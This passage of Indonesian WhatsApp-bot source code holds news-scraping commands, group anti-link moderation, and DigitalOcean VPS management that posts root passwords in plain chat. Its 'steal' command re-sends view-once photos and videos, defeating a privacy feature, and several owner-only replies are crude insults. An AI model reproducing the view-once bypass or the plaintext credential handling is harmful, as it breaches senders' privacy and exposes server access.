iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'sindo':


SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
break
//=================================================//
case 'tempo':


TempoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'antara':


AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "kontan":


KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "merdeka":


MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "jalantikus":

var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
ptz.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
break
        
case 'steal': {
if (!m.quoted) return reply(`Reply view once message to use this command`)
let typeS = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[typeS]
var mediaaaaaaaaaa = await downloadContentFromMessage(quotedType, typeS == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (let chunk of mediaaaaaaaaaa) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await ptz.sendMessage(m.chat, { video: buffer, caption: quotedType.caption }, {quoted: m })
} 
else if (/image/.test(type)) {
await ptz.sendMessage(m.chat, { image: buffer, caption: quotedType.caption }, {quoted: m })
}
}
break;
// anti
        case 'antilinkgc': {
//if (!isCreator) return m.reply('Kamu bukan Owner')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
//if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')

if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (chatdb.antilinkgc) return m.reply('Sudah Aktif')
chatdb.antilinkgc = true
m.reply('Succes menyalakan antilink di group ini')
} else if (args[0] === "off") {
if (!chatdb.antilinkgc) return m.reply('Sudah Mati')
chatdb.antilinkgc = false
m.reply('Succes mematikan antilink di group ini')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antiwame': {
if (!isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot harus jadi admin`)
////if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus admin & Owner gue`)
if (args[0] === "on") {
if (antiWame) return reply('Already activated')
ntwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
// reply('Success in turning on antiwame in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return reply('Already deactivated')
let off = nttoxic.indexOf(m.chat)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
reply('Success in turning off antiwame in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break     
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return reply('Already activated')
ntilinkytvid.push(m.chat)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
// reply('Success in turning on youtube video antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return reply('Already deactivated')
let off = ntilinkytvid.indexOf(m.chat)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
reply('Success in turning off youtube video antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return reply('Already activated')
ntilinkytch.push(m.chat)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
// reply('Success in turning on youtube channel antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return reply('Already deactivated')
let off = ntilinkytch.indexOf(m.chat)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
reply('Success in turning off youtube channel antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkFacebook) return reply('Already activated')
ntilinkfb.push(m.chat)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
// reply('Success in turning on facebook antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('Already deactivated')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply('Success in turning off facebook antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'antilinktele': case 'antilinktg': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkTelegram) return reply('Already activated')
ntilinktg.push(m.chat)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
// reply('Success in turning on telegram antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return reply('Already deactivated')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
reply('Success in turning off telegram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkTiktok) return reply('Already activated')
ntilinktt.push(m.chat)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
// reply('Success in turning on tiktok antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return reply('Already deactivated')
let off = ntilinktt.indexOf(m.chat)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
reply('Success in turning off tiktok antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('Already activated')
ntilinktwt.push(m.chat)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
// reply('Success in turning on twitter antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return reply('Already deactivated')
let off = ntilinktwt.indexOf(m.chat)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
reply('Success in turning off twitter antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break  
   case 'antilinkall': {
if (!isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot harus jadi admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus admin & Owner gue`)
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('Already activated')
ntilinkall.push(m.chat)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
// reply('Success in turning on all antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return reply('Already deactivated')
let off = ntilinkall.indexOf(m.chat)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
reply('Success in turning off all antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break        


// DO
case "sisadroplet":{
if (!isCreator) return reply(`Ngapain Woi Tolol Yatim`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isCreator) {
      return reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
    if (!isCreator) return reply(`Idih Yatim So Asik Kontol`)
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
  if (!isCreator) return reply(`Yatim Kontol Rese`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 ptz.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
case "listdroplet": {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      ptz.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
  if (!isCreator) return reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      ptz.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      ptz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "vps1g1c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

